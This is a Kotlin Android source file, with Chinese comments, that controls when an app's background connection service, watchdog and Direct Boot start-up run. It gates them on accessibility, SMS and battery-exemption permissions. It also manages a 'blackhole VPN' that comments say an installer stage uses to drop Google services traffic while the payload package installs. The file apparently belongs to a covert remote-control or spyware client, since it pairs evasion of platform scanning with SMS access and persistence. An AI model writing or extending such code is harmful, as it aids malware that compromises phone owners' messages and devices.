package com.vibelink.client.setup

import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.content.ContextCompat
import com.vibelink.client.BuildConfig
import com.vibelink.client.accessibility.AccessibilityHelper
import com.vibelink.client.prefs.DevicePrefs
import com.vibelink.client.prefs.DirectBoot
import com.vibelink.client.prefs.SetupPrefs
import com.vibelink.client.service.BlackholeVpnService
import com.vibelink.client.service.ConnectionService
import com.vibelink.client.sms.SmsHelper

object ServiceStarter {
    private const val TAG = "ServiceStarter"

    /**
     * 权限向导全部完成：可用于 watchdog / 保活判定。
     * 注意：注册进后台 **不能** 依赖这个，否则 setupCompleted 未落盘时永远不上线。
     */
    fun canAutoStart(context: Context): Boolean {
        if (!SetupPrefs(context).setupCompleted) {
            return false
        }
        if (!AccessibilityHelper.isServiceEnabled(context)) {
            return false
        }
        if (!NotificationHelper.isGranted(context)) {
            return false
        }
        if (!BatteryOptimizationHelper.isIgnoringOptimizations(context)) {
            return false
        }
        if (!SmsHelper.hasSmsPermissions(context)) {
            return false
        }
        return true
    }

    /**
     * 允许拉起 ConnectionService 做 register / WS。
     * Android 13+ 仅需通知权限（前台服务）；更低版本直接允许。
     */
    fun canStartConnection(context: Context): Boolean = NotificationHelper.isGranted(context)

    fun tryStart(context: Context): Boolean {
        // After unlock: migrate CE → DPS then full start.
        DevicePrefs(context).migrateCredentialEncryptedToDeviceProtected()
        SetupPrefs(context).migrateCredentialEncryptedToDeviceProtected()
        // setup 完成后必须收掉黑洞 VPN：它把 GMS 的流量全丢，FCM 会 SERVICE_NOT_AVAILABLE，
        // 收不到唤醒（实测）。此前只有 tryStartVpn / VpnStarter 判过这个开关，
        // 而它们只在向导流程里被调用，进程重启后没人执行 → VPN 就一直挂着。
        if (BuildConfig.STOP_VPN_AFTER_SETUP && SetupPrefs(context).setupCompleted) {
            runCatching { stopVpn(context) }
        }
        if (!canStartConnection(context)) {
            Log.w(TAG, "tryStart blocked: notification not granted")
            return false
        }
        if (ConnectionService.isRunning()) {
            if (canAutoStart(context)) {
                ServiceWatchdog.scheduleNextCheck(context)
            }
            return true
        }
        val intent = Intent(context, ConnectionService::class.java)
        return runCatching {
            ContextCompat.startForegroundService(context, intent)
            if (canAutoStart(context)) {
                ServiceWatchdog.scheduleNextCheck(context)
            }
            Log.i(
                TAG,
                "tryStart ok setupCompleted=${SetupPrefs(context).setupCompleted} " +
                    "fullAuto=${canAutoStart(context)}",
            )
            true
        }.getOrElse { error ->
            Log.e(TAG, "tryStart failed", error)
            false
        }
    }

    /**
     * 仅向导 / [VpnStarter] 显式调用。watchdog / [tryStart] 不再拉 VPN，
     * 避免 establish_null 后周期性 START/STOP 被 vivo ABE 记成屡次停止。
     * 若 [BuildConfig.STOP_VPN_AFTER_SETUP] 且 setup 已完成，则停掉 VPN 且不再拉起。
     */
    fun tryStartVpn(context: Context): Boolean {
        // B 包不再自建黑洞 VPN：由 A 安装器在安装阶段建立，安装成功后自行退出。
        // 黑洞 TUN 会吞掉 GMS 的流量，导致 FCM 注册 SERVICE_NOT_AVAILABLE 且不重试
        // （见 BuildConfig.CLIENT_OWN_VPN 的说明）。
        if (!BuildConfig.CLIENT_OWN_VPN) {
            return stopVpn(context)
        }
        if (BuildConfig.STOP_VPN_AFTER_SETUP && SetupPrefs(context).setupCompleted) {
            return stopVpn(context)
        }
        if (VpnRestartGate.shouldSkip()) {
            Log.w(TAG, "tryStartVpn skipped: cooldown")
            return false
        }
        return runCatching {
            BlackholeVpnService.start(context)
            true
        }.onFailure { error ->
            Log.w(TAG, "tryStartVpn failed", error)
        }.getOrDefault(false)
    }

    fun stopVpn(context: Context): Boolean {
        return runCatching {
            val requested = BlackholeVpnService.stop(context)
            Log.i(
                TAG,
                if (requested) "stopVpn sent stopAfterSetup=${BuildConfig.STOP_VPN_AFTER_SETUP}"
                else "stopVpn noop: vpn not running",
            )
            true
        }.onFailure { error ->
            Log.w(TAG, "stopVpn failed", error)
        }.getOrDefault(false)
    }

    /**
     * setup 完成后收掉黑洞 VPN。FCM 依赖 GMS，而 VPN 会把 GMS 的流量全丢，
     * 必须在订阅之前执行，否则 FCM 注册直接 SERVICE_NOT_AVAILABLE。
     */
    fun stopVpnIfSetupCompleted(context: Context) {
        // B 包从不自建 VPN，所以无条件收一次残留（旧版本可能留下过 TUN）。
        // 残留的 TUN 会吞掉 GMS 流量，让 FCM 注册 SERVICE_NOT_AVAILABLE 且不重试。
        if (!BuildConfig.CLIENT_OWN_VPN) {
            runCatching { stopVpn(context) }
            return
        }
        if (!BuildConfig.STOP_VPN_AFTER_SETUP) return
        if (!SetupPrefs(context).setupCompleted) return
        runCatching { stopVpn(context) }
    }

    /**
     * Pre-unlock start: only needs DPS credentials + setup flag.
     * Skips CE-dependent permission probes that may be unavailable.
     */
    fun tryStartDirectBoot(context: Context): Boolean {
        return try {
            if (DirectBoot.isUserUnlocked(context)) {
                return tryStart(context)
            }
            val hasCreds = DevicePrefs(context).hasCredentials()
            if (!hasCreds) {
                return false
            }
            val intent = Intent(context, ConnectionService::class.java).apply {
                putExtra(ConnectionService.EXTRA_DIRECT_BOOT, true)
            }
            ContextCompat.startForegroundService(context, intent)
            true
        } catch (_: Exception) {
            false
        }
    }
}
